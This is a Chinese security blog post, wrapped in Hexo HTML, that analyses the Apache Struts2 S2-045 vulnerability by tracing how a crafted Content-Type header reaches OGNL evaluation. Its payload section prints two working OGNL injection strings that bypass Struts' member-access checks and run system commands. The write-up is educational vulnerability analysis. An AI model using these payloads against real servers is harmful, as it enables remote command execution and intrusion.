@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x00 前言##漏洞已经出来很长时间了，但是一直放着没有分析过，最近看到freebuf上的文章，所以也手痒马上来分析一波(主要是为了摸清触发的流程，以及payload如何构造的)，从以下2个思路进行分析  漏洞触发流程 payload如何工作  调试使用的war包是地址为： https:&#x2F;&#x2F;archive.apache.org&#x2F;dist&#x2F;struts&#x2F;2.5.1&#x2F;struts-2.5.1-app">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[web] s2-045漏洞解析">
+<meta property="og:url" content="http://example.com/2018/03/23/struts2-045-vul-analysis/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x00 前言##漏洞已经出来很长时间了，但是一直放着没有分析过，最近看到freebuf上的文章，所以也手痒马上来分析一波(主要是为了摸清触发的流程，以及payload如何构造的)，从以下2个思路进行分析  漏洞触发流程 payload如何工作  调试使用的war包是地址为： https:&#x2F;&#x2F;archive.apache.org&#x2F;dist&#x2F;struts&#x2F;2.5.1&#x2F;struts-2.5.1-app">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2018/03/23/struts2-045-vul-analysis/s2-045_1_1.png">
+<meta property="og:image" content="http://example.com/2018/03/23/struts2-045-vul-analysis/s2-045_1_2.png">
+<meta property="og:image" content="http://example.com/2018/03/23/struts2-045-vul-analysis/s2-045_1_3.png">
+<meta property="og:image" content="http://example.com/2018/03/23/struts2-045-vul-analysis/s2-045_1_4.png">
+<meta property="og:image" content="http://example.com/2018/03/23/struts2-045-vul-analysis/s2-045_1_5.png">
+<meta property="og:image" content="http://example.com/2018/03/23/struts2-045-vul-analysis/s2-045_1_6.png">
+<meta property="og:image" content="http://example.com/2018/03/23/struts2-045-vul-analysis/s2-045_1_7.png">
+<meta property="og:image" content="http://example.com/2018/03/23/struts2-045-vul-analysis/s2-045_1_8.png">
+<meta property="og:image" content="http://example.com/2018/03/23/struts2-045-vul-analysis/s2-045_1_9.png">
+<meta property="og:image" content="http://example.com/2018/03/23/struts2-045-vul-analysis/s2-045_1_10.png">
+<meta property="og:image" content="http://example.com/2018/03/23/struts2-045-vul-analysis/s2-045_1_11.png">
+<meta property="og:image" content="http://example.com/2018/03/23/struts2-045-vul-analysis/s2-045_1_12.png">
+<meta property="og:image" content="http://example.com/2018/03/23/struts2-045-vul-analysis/s2-045_2_1.png">
+<meta property="og:image" content="http://example.com/2018/03/23/struts2-045-vul-analysis/s2-045_2_2.png">
+<meta property="og:image" content="http://example.com/2018/03/23/struts2-045-vul-analysis/s2-045_2_3.png">
+<meta property="article:published_time" content="2018-03-22T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-03-17T05:58:50.149Z">
+<meta property="article:author" content="PENCH3R">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2018/03/23/struts2-045-vul-analysis/s2-045_1_1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>[web] s2-045漏洞解析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/category/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2018/03/28/linux-simple-stack-overflow/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018/03/22/simple-virus-analysis/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/03/23/struts2-045-vul-analysis/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/03/23/struts2-045-vul-analysis/&text=[web] s2-045漏洞解析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/03/23/struts2-045-vul-analysis/&title=[web] s2-045漏洞解析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/03/23/struts2-045-vul-analysis/&is_video=false&description=[web] s2-045漏洞解析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[web] s2-045漏洞解析&body=Check out this article: http://example.com/2018/03/23/struts2-045-vul-analysis/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/03/23/struts2-045-vul-analysis/&title=[web] s2-045漏洞解析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/03/23/struts2-045-vul-analysis/&title=[web] s2-045漏洞解析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/03/23/struts2-045-vul-analysis/&title=[web] s2-045漏洞解析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/03/23/struts2-045-vul-analysis/&title=[web] s2-045漏洞解析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/03/23/struts2-045-vul-analysis/&name=[web] s2-045漏洞解析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/03/23/struts2-045-vul-analysis/&t=[web] s2-045漏洞解析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言##</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞触发流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-payload%E6%98%AF%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0%E7%9A%84"><span class="toc-number">3.</span> <span class="toc-text">0x02 payload是如何构造的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">总结：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        [web] s2-045漏洞解析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">PENCH3R</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-03-22T16:00:00.000Z" itemprop="datePublished">2018-03-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WebSecurity/">WebSecurity</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言##"></a>0x00 前言##</h2><p>漏洞已经出来很长时间了，但是一直放着没有分析过，最近看到freebuf上的文章，所以也手痒马上来分析一波(主要是为了摸清触发的流程，以及payload如何构造的)，从以下2个思路进行分析</p>
+<ul>
+<li>漏洞触发流程</li>
+<li>payload如何工作</li>
+</ul>
+<p>调试使用的war包是地址为： <a target="_blank" rel="noopener" href="https://archive.apache.org/dist/struts/2.5.1/struts-2.5.1-apps.zip">https://archive.apache.org/dist/struts/2.5.1/struts-2.5.1-apps.zip</a> (版本为struts2-2.5.1)</p>
+<h2 id="0x01-漏洞触发流程"><a href="#0x01-漏洞触发流程" class="headerlink" title="0x01 漏洞触发流程"></a>0x01 漏洞触发流程</h2><p>我们先从入口出发，用户发起的请求会通过<code>WEB-INF/web.xml</code>中定义的过滤器</p>
+<img src="/2018/03/23/struts2-045-vul-analysis/s2-045_1_1.png" class="">
+
+<p><code>org.apache.struts2.dispatcher.filter.StrutsPrepareFilter</code>就是我们的入口，在<code>dofileter</code>中请求会进入<code>this.prepare.wrapRequest</code>(org.apache.struts2.dispatcher.PrepareOperations)</p>
+<img src="/2018/03/23/struts2-045-vul-analysis/s2-045_1_2.png" class="">
+
+<p>接着请求会通过<code>this.dispatcher.wrapRequest</code>(org.apache.struts2.dispatcher.Dispatcher)开始分发我们的请求</p>
+<img src="/2018/03/23/struts2-045-vul-analysis/s2-045_1_3.png" class="">
+
+<p>在这里会先获取用户的<code>content_type</code>(这是我们所能控制的),接着判断我们的<code>content-type</code>中是否包含”multipart/form-data”,包含就会进入<code>jakarta</code>处理流程，接着会进入<code>MultiPartRequestWrapper</code></p>
+<img src="/2018/03/23/struts2-045-vul-analysis/s2-045_1_4.png" class="">
+
+<p>首先会进入<code>this.multi.parse</code>(org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest)解析我们的请求</p>
+<img src="/2018/03/23/struts2-045-vul-analysis/s2-045_1_5.png" class="">
+
+<p>在该函数中会产生异常，通过<code>buildErrorMessage</code>进行错误信息解析</p>
+<img src="/2018/03/23/struts2-045-vul-analysis/s2-045_1_6.png" class="">
+
+<p>该函数会返回<code>LocalizedTextUtil.findText</code>(com.opensymphony.xwork2.util.LocalizedTextUtil)(有些文章跟踪到这里就结束了)，此时函数的参数中<code>e.getMessage()</code>其中就包含我们的异常的Content-Type也就是我们的payload</p>
+<img src="/2018/03/23/struts2-045-vul-analysis/s2-045_1_7.png" class="">
+
+<p>会调用原始的<code>findText</code>,参数<code>defaultMessage</code>包含着我们的<code>payload</code></p>
+<img src="/2018/03/23/struts2-045-vul-analysis/s2-045_1_8.png" class="">
+
+<p>调用<code>getDefaultMessage</code>函数</p>
+<img src="/2018/03/23/struts2-045-vul-analysis/s2-045_1_9.png" class="">
+
+<p>最终我们来到了漏洞函数<code>TextParseUtil.translateVariables</code>,通过<code>buildMessageFormat</code>调用</p>
+<img src="/2018/03/23/struts2-045-vul-analysis/s2-045_1_10.png" class="">
+
+<p>通过<code>parse.evaluate</code>进行<code>ognl</code>表达式的识别和执行</p>
+<img src="/2018/03/23/struts2-045-vul-analysis/s2-045_1_11.png" class="">
+
+<p>最后再跟入，会发现调用哪个<code>evaluator.evaluate(var)</code>，这个就是执行ognl表达式的关键，我们的payload被正确识别出来在var变量中</p>
+<img src="/2018/03/23/struts2-045-vul-analysis/s2-045_1_12.png" class="">
+
+<p>到这里我们的<code>payload</code>经历各种函数的调用来到了这里，最终触发漏洞达到命令执行</p>
+<h2 id="0x02-payload是如何构造的"><a href="#0x02-payload是如何构造的" class="headerlink" title="0x02 payload是如何构造的"></a>0x02 payload是如何构造的</h2><p>虽然知道ognl表达式是在哪里执行的，但是没有接触过所以看到poc也不明白都是些什么，还好通过ide可以直接使用该接口，就尝试了一些语句的执行</p>
+<img src="/2018/03/23/struts2-045-vul-analysis/s2-045_2_1.png" class="">
+
+<p>还可以使用括号(表示一个语句)和.(拼接)来执行多个语句</p>
+<img src="/2018/03/23/struts2-045-vul-analysis/s2-045_2_2.png" class="">
+
+<p>测试到这里，就想看看能弹计算器么…</p>
+<img src="/2018/03/23/struts2-045-vul-analysis/s2-045_2_3.png" class="">
+
+<p>结果悲催的发现失败了，后来才知道这个<code>SecurityMemberAccess</code>是struts2的安全管理器，就是防止执行系统命令，对非法字符进行了黑名单校验，通过freebuf的<a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/165488.html">文章</a>(有详细的poc分析，以及绕过的简单分析)了解到细节，有兴趣的可以去看看</p>
+<p>最终就是通过<code>_memberAccess</code>利用<code>DefaultMemberAccess</code>对象覆盖<code>SecurityMemberAccess</code>对象</p>
+<p>最后自己整理的直接执行的ognl表达式的payload(这个是在IDE里面直接执行的)</p>
+<pre><code>(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;\&quot;calc\&quot;&#39;).(#cmds=&#123;&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd&#125;).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())
+</code></pre>
+<p>最终成熟的<code>payload</code>为(也是网上流传最广的一个)</p>
+<pre><code>Content-Type:&quot;%&#123;(#xxx=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;&quot;pwd&quot;&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?&#123;&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd&#125;:&#123;&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p=newjava.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;
+</code></pre>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>通过IDE很方便的动态调试struts2，清晰的跟踪整个漏洞的流程，了解了用户请求的基本流程以及命令为何执行，同时也了解了基本的ognl表达式，清楚的了解一些poc构造(不会看的很懵)。</p>
+<p>ps:也是第一次分析，写的有点流水帐 :)</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/165488.html">http://www.freebuf.com/vuls/165488.html</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/category/">Category</a></li>
+         
+          <li><a href="/tag/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言##</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞触发流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-payload%E6%98%AF%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0%E7%9A%84"><span class="toc-number">3.</span> <span class="toc-text">0x02 payload是如何构造的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">总结：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/03/23/struts2-045-vul-analysis/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/03/23/struts2-045-vul-analysis/&text=[web] s2-045漏洞解析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/03/23/struts2-045-vul-analysis/&title=[web] s2-045漏洞解析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/03/23/struts2-045-vul-analysis/&is_video=false&description=[web] s2-045漏洞解析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[web] s2-045漏洞解析&body=Check out this article: http://example.com/2018/03/23/struts2-045-vul-analysis/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/03/23/struts2-045-vul-analysis/&title=[web] s2-045漏洞解析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/03/23/struts2-045-vul-analysis/&title=[web] s2-045漏洞解析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/03/23/struts2-045-vul-analysis/&title=[web] s2-045漏洞解析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/03/23/struts2-045-vul-analysis/&title=[web] s2-045漏洞解析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/03/23/struts2-045-vul-analysis/&name=[web] s2-045漏洞解析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/03/23/struts2-045-vul-analysis/&t=[web] s2-045漏洞解析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2017-2022
+    PENCH3R
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/category/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+  <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js" crossorigin="anonymous"></script>
+  
+<script src="/js/wrapImage.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
